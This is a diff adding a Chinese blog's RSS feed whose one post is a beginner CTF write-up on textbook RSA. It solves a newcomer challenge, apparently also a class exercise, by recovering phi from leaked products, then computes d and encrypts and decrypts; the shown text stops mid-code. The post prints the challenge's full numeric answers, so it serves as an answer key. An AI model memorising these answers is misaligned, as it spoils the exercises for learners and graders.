@@ -1,0 +1,819 @@
+<?xml version="1.0"?>
+<rss version="2.0">
+    <channel>
+        <title>we1c0me_t0 my odyssey domain</title>
+        <subtitle>&#34; 一切选择，都有其意义 &#34; —— 《VALORANT》 ISO</subtitle>
+        <icon>https://0d0-1yp0.github.io/assets/favicon.ico</icon>
+        <link>https://0d0-1yp0.github.io</link>
+        <author>
+          <name>0d0_1yp0</name>
+        </author>
+        <description>ps:当前站版本v1.10。右上角可以切换日夜主题。遇到长时间加载是bug，可以刷新或者重进。目前文章只往csdn搬https://blog.csdn.net/2201_75506722?type=blog</description>
+        <language>zh-cn</language>
+        <pubDate>Sun, 22 Dec 2024 00:00:00 +0800</pubDate>
+        <lastBuildDate>Sun, 22 Dec 2024 00:00:00 +0800</lastBuildDate>
+        <item>
+            <guid isPermalink="true">https://0d0-1yp0.github.io/2024/12/22/CTF/crypto/%E4%BB%A5%E4%B8%80%E9%81%93CTF%E9%A2%98%E7%9C%9F%E6%AD%A3%E5%88%9D%E8%AF%86RSA/</guid>
+            <title>以一道CTF题真正初识RSA</title>
+            <link>https://0d0-1yp0.github.io/2024/12/22/CTF/crypto/%E4%BB%A5%E4%B8%80%E9%81%93CTF%E9%A2%98%E7%9C%9F%E6%AD%A3%E5%88%9D%E8%AF%86RSA/</link>
+            <category term="CTF" scheme="https://0d0-1yp0.github.io/categories/CTF/" />
+            <category term="密码学" scheme="https://0d0-1yp0.github.io/categories/CTF/crypto/" />
+            <category term="CTF" scheme="https://0d0-1yp0.github.io/tags/CTF/" />
+            <category term="密码" scheme="https://0d0-1yp0.github.io/tags/%E5%AF%86%E7%A0%81/" />
+            <pubDate>Sun, 22 Dec 2024 00:00:00 +0800</pubDate>
+            <description><![CDATA[ &lt;blockquote&gt;
+&lt;p&gt;给我的 crypto 入个门，入个门被数学✌薄纱&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;本文借 (chao) 鉴 (xi) 了鄙校北神上课用的用例，希望明年上课的师弟搜到这个文章不会影响佬师上课啊哈哈哈 ww&lt;/p&gt;
+&lt;p&gt;开始前可以看一眼 RSA 的基本原理，本文不会提到很深&lt;/p&gt;
+&lt;p&gt;&lt;s&gt;数学不好，密码还是太难了，一个字都看不懂哈哈哈哈哈哈哈&lt;/s&gt;&lt;/p&gt;
+&lt;p&gt;先用一个入门的 pip 包吧&lt;/p&gt;
+&lt;figure class=&#34;highlight bash&#34;&gt;&lt;figcaption data-lang=&#34;bash&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;pip &lt;span class=&#34;token function&#34;&gt;install&lt;/span&gt; pycryptodome&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;开始，根据一道 CTF 题慢慢来&lt;/p&gt;
+&lt;h2 id=&#34;先改一下flag以调通newcomerpy代码&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#先改一下flag以调通newcomerpy代码&#34;&gt;#&lt;/a&gt; 先改一下 flag 以调通 newcomer.py 代码&lt;/h2&gt;
+&lt;blockquote&gt;
+&lt;p&gt;题目：初识 RSA&lt;br /&gt;
+ 来源：XSCTF 新人选拔赛&lt;br /&gt;
+描述：p 和 q 藏起来了，你能帮我找到它们吗？&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;我找个 damn&lt;/p&gt;
+&lt;figure class=&#34;highlight python&#34;&gt;&lt;figcaption data-lang=&#34;python&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;from&lt;/span&gt; Crypto&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;Util&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;number &lt;span class=&#34;token keyword&#34;&gt;import&lt;/span&gt; bytes_to_long&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;inverse&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;getPrime&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;from&lt;/span&gt; flag &lt;span class=&#34;token keyword&#34;&gt;import&lt;/span&gt; flag&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;4&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;m &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; bytes_to_long&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;flag&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;5&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;6&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;p &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; getPrime&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;1024&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;7&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;q &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; getPrime&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;1024&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;8&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;n &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; p&lt;span class=&#34;token operator&#34;&gt;*&lt;/span&gt;q&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;9&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;n&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;10&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;e &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;65537&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;11&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;12&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;c &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token builtin&#34;&gt;pow&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;m&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;e&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;n&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;13&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;14&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;pq &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; p&lt;span class=&#34;token operator&#34;&gt;*&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;q&lt;span class=&#34;token operator&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;15&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;qp &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; q&lt;span class=&#34;token operator&#34;&gt;*&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;p&lt;span class=&#34;token operator&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;16&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;17&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;c=&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;c&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;18&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;n=&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;n&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;19&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;pq=&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;pq&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;20&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;qp=&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;qp&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;21&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;22&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token triple-quoted-string string&#34;&gt;&#39;&#39;&#39;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;23&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;c= 8722269075970644434253339592758512788160408912707387632591552130175707843950684315083250494010055435391879036285103810263591951437829414438640307561645721347859659807138051841516634704123100270651976676182059252251162982609391666023674158274992400910869692389001622774140191223807887675081808561012755545464977015973615407965906513878979919700065923364884766974187303774330319143647840846354404070430118235352622445115153298578370521811697710289716188726587743282814946239856766713516166990341116198180068191759095913957606379780234116317390622824096667107736103270907349927467971817639795094030622157581511033950777&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;24&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;n= 10466186506773626671397261081802640650185744558208505628349249045496105597268556020207175016523119333667851114848452038431498926527983706092607207796937431312520131882751891731564121558651246025754915145600686076505962750195353958781726515647847167067621799990588328894365930423844435964506372428647802381074584935050067254029262890188260006596141011807724688556673520261743199388391094490191001701011230322653422314758778116196105077883955436582364267530633358016652912054880813710531145973799193443828969535902856467548523653920307742364119002349899553478815101092655897400295925170383678499125295006364960124859003&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;25&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;pq= 10466186506773626671397261081802640650185744558208505628349249045496105597268556020207175016523119333667851114848452038431498926527983706092607207796937431312520131882751891731564121558651246025754915145600686076505962750195353958781726515647847167067621799990588328894365930423844435964506372428647802381074488896197029704465200125337817646702009123916866455067019234171839614862660036737875747177391796376553159880972782837853473250804807544086701088829096838316550146794766718580877976153967582795248676367265069623900208276878140709691073369415161936376086988069213820933152601453587292943483693378833664901178324&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;26&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;qp= 10466186506773626671397261081802640650185744558208505628349249045496105597268556020207175016523119333667851114848452038431498926527983706092607207796937431312520131882751891731564121558651246025754915145600686076505962750195353958781726515647847167067621799990588328894365930423844435964506372428647802381074475956379708898904933143429835002718457573266164923043251954374464149976302585916538814746811455883837138715445492053610047383292461097590195481556557381952895539341802954749542143253491617052100969586396996063822508764438280468492894012685918249843558593322831683872737943676955669923498182824352081785243246&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;27&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&#39;&#39;&#39;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;原题是引入的 flag 文件，把那行注释掉，下面加一行自己写的 flag 就行，记得用 b 包裹&lt;/p&gt;
+&lt;h2 id=&#34;用自己的语言写出rsa公钥和私钥的计算公式使用pqphined为符号&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#用自己的语言写出rsa公钥和私钥的计算公式使用pqphined为符号&#34;&gt;#&lt;/a&gt; 用自己的语言写出 RSA 公钥和私钥的计算公式（使用 p，q，phi，n，e，d 为符号）&lt;/h2&gt;
+&lt;p&gt;设 p，q 为大质数，n=pq&lt;/p&gt;
+&lt;p&gt;phi=(p-1)(q-1)&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;根据欧拉函数，phi=(p-1)(q-1)，此部分的证明可以搜一下或者问问强大的大语言模型&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;e=65537 (公钥指数，任意小于 phi 并与其互质的即可)&lt;/p&gt;
+&lt;p&gt;d=inverse (e,phi)(私钥指数)&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;inverse 在库里带了，求逆元的意思&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;公钥对即为 e，n；私钥对即为 d，n&lt;/p&gt;
+&lt;h2 id=&#34;利用题目下方注释中的已知变量计算phi并利用inverse函数编程计算e在模phi意义下的乘法逆元记为d根据程序运行结果写出d的具体数值&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#利用题目下方注释中的已知变量计算phi并利用inverse函数编程计算e在模phi意义下的乘法逆元记为d根据程序运行结果写出d的具体数值&#34;&gt;#&lt;/a&gt; 利用题目下方注释中的已知变量计算 phi，并利用 inverse 函数编程计算 e 在模 phi 意义下的乘法逆元，记为 d，根据程序运行结果写出 d 的具体数值；&lt;/h2&gt;
+&lt;p&gt;别想太多，n=p*q，那么极其显然&lt;/p&gt;
+&lt;p&gt;phi 就是 pq&lt;em&gt;qp/n（别把这里面的 pq 理解成 p&lt;/em&gt; * q，看上面的 python 代码哦同学）&lt;/p&gt;
+&lt;p&gt;（请忽略我的背景柚子厨怎么你了 wwwwwww）&lt;/p&gt;
+&lt;p&gt;&lt;img loading=&#34;lazy&#34; data-src=&#34;https://blog-store-1325083740.cos.ap-beijing.myqcloud.com/image-20241222195849333.png&#34; alt=&#34;image-20241222195849333&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;sagemath 命令行还有一些常用的东西，可以看我其他的文章（挖坑）&lt;/p&gt;
+&lt;p&gt;&lt;img loading=&#34;lazy&#34; data-src=&#34;https://blog-store-1325083740.cos.ap-beijing.myqcloud.com/image-20241222202021405.png&#34; alt=&#34;image-20241222202021405&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;你算对了吗？&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;phi=(pq*qp) //n，这句话如果用单 / 会报 OverflowError: integer division result too large for a float。是除法运算导致的类型溢出，用双 // 即可。&lt;/p&gt;
+&lt;p&gt;单 / 就是执行&lt;strong&gt;浮点数除法&lt;/strong&gt;，即普通的除法操作，双 // 就是执行&lt;strong&gt;整数除法&lt;/strong&gt;，即地板除法&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;h2 id=&#34;根据下列给出的p-q-e根据rsa算法编程计算公钥n与私钥d&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#根据下列给出的p-q-e根据rsa算法编程计算公钥n与私钥d&#34;&gt;#&lt;/a&gt; 根据下列给出的 p、q、e，根据 RSA 算法编程计算公钥 n 与私钥 d；&lt;/h2&gt;
+&lt;blockquote&gt;
+&lt;p&gt;p=173747400775037237499119138628710917207976935718394035613063219109153197713240288497094852951328821120301146137416392125632164384666157952079993477037237778043103278877799120982366215399159107746276881271883220494577745511406216675640773966244559596835970378099355485746784486359013819361014997811485589135463&lt;/p&gt;
+&lt;p&gt;q=131816585373639721213952582957741137275970828607414189698553233434142961482639192734668517311468596205692079539001403643395543816907261944034422413069781755026864643651448329100659792941632674865761952547883089120086825249692433942528976412805682521697534499714513072333159601382118300897685368738513700813533&lt;/p&gt;
+&lt;p&gt;e=65537&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;没什么好说的，建议同学们先自己做一下在对答案，错了回去看看上面的&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;n=22902789087710692282201627723972920087676945775651369909558749681603601877066490004280829887082860024866325792922333359888979450409785852136285331867214311784932513053946349686873084098919921626735642656688483918867105990444133292660146552582773030563402978424369091489168537829677450378086515187008083500599611600232061376101775199885242634728744796816625633726726074004731386467983188726961022911791843528459801349329514692878947844318287016330210241002676592845651108656701768277324789376390295075009358573926461653230171198186299924562887630088294834319717425915382663997302617669638278141644149065887129240620779&lt;/p&gt;
+&lt;p&gt;d=19271863372140646463624718313226644858249851666842334809381515307252297674818586817615620577428910108660806391844117335212132837202625393102518076757881313639679468046843452495262065227324059965356828746942945552493466195508226172853946655099900580076597708945613657755972616318922476707819049590581423940789934387916037469210407055279325381173039093072419831193470910945428027164177392052950722125466565541460489747701257832749756103367996775905993293368370146016279539314698750416709668194421867922941773222876602958853233196249715041186342934713607756322667953880385223035641130659335671630397231173571336884350777&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;h2 id=&#34;利用上述公钥n-e对你名字全拼如liuyangfan进行加密&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#利用上述公钥n-e对你名字全拼如liuyangfan进行加密&#34;&gt;#&lt;/a&gt; 利用上述公钥 n、e 对你名字全拼（如：liuyangfan）进行加密&lt;/h2&gt;
+&lt;figure class=&#34;highlight python&#34;&gt;&lt;figcaption data-lang=&#34;python&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;from&lt;/span&gt; Crypto&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;Util&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;number &lt;span class=&#34;token keyword&#34;&gt;import&lt;/span&gt; bytes_to_long&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;inverse&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;getPrime&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;long_to_bytes&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;# #from flag import flag&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;4&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;flag&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;b&#39;flag coming~&#39;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;5&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;6&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;m &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; bytes_to_long&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;flag&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;7&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;8&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;9&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;p&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;173747400775037237499119138628710917207976935718394035613063219109153197713240288497094852951328821120301146137416392125632164384666157952079993477037237778043103278877799120982366215399159107746276881271883220494577745511406216675640773966244559596835970378099355485746784486359013819361014997811485589135463&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;10&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;q&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;131816585373639721213952582957741137275970828607414189698553233434142961482639192734668517311468596205692079539001403643395543816907261944034422413069781755026864643651448329100659792941632674865761952547883089120086825249692433942528976412805682521697534499714513072333159601382118300897685368738513700813533&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;11&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;e&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;65537&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;12&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;n&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;22902789087710692282201627723972920087676945775651369909558749681603601877066490004280829887082860024866325792922333359888979450409785852136285331867214311784932513053946349686873084098919921626735642656688483918867105990444133292660146552582773030563402978424369091489168537829677450378086515187008083500599611600232061376101775199885242634728744796816625633726726074004731386467983188726961022911791843528459801349329514692878947844318287016330210241002676592845651108656701768277324789376390295075009358573926461653230171198186299924562887630088294834319717425915382663997302617669638278141644149065887129240620779&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;13&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;d&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;19271863372140646463624718313226644858249851666842334809381515307252297674818586817615620577428910108660806391844117335212132837202625393102518076757881313639679468046843452495262065227324059965356828746942945552493466195508226172853946655099900580076597708945613657755972616318922476707819049590581423940789934387916037469210407055279325381173039093072419831193470910945428027164177392052950722125466565541460489747701257832749756103367996775905993293368370146016279539314698750416709668194421867922941773222876602958853233196249715041186342934713607756322667953880385223035641130659335671630397231173571336884350777&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;14&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;15&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;c &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token builtin&#34;&gt;pow&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;m&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;e&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;n&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;16&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;c=&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;c&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;豪丸，哈哈&lt;/p&gt;
+&lt;h2 id=&#34;利用上述私钥d将下列密文c解密为明文用long_to_bytes转为字节码打印&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#利用上述私钥d将下列密文c解密为明文用long_to_bytes转为字节码打印&#34;&gt;#&lt;/a&gt; 利用上述私钥 d，将下列密文 c 解密为明文（用 long_to_bytes 转为字节码打印）&lt;/h2&gt;
+&lt;blockquote&gt;
+&lt;p&gt;c=22383445933736798279478032679517743837766449187698865398822423786317612396771654040156586654564003392384975014045643201026069165276350584034120841617657486555798948939049343900381125798000000172357016404870066390095970211708364996514629691512019106870733929516372325207940525326467947232996619729431748024769431567208774806188872803942768881324395058229038610826245541466028073553184615680354118655959979504640632739098044460639023736294401801478667944983999124796530293982085703611284581213900570723479615642643430713949661089128106079384524944632103663244376051089098793845750645708721359256022997797080498949228931&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;figure class=&#34;highlight python&#34;&gt;&lt;figcaption data-lang=&#34;python&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;from&lt;/span&gt; Crypto&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;Util&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;number &lt;span class=&#34;token keyword&#34;&gt;import&lt;/span&gt; bytes_to_long&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;inverse&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;getPrime&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;long_to_bytes&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;# #from flag import flag&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;4&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;p&lt;span class=&#34;token 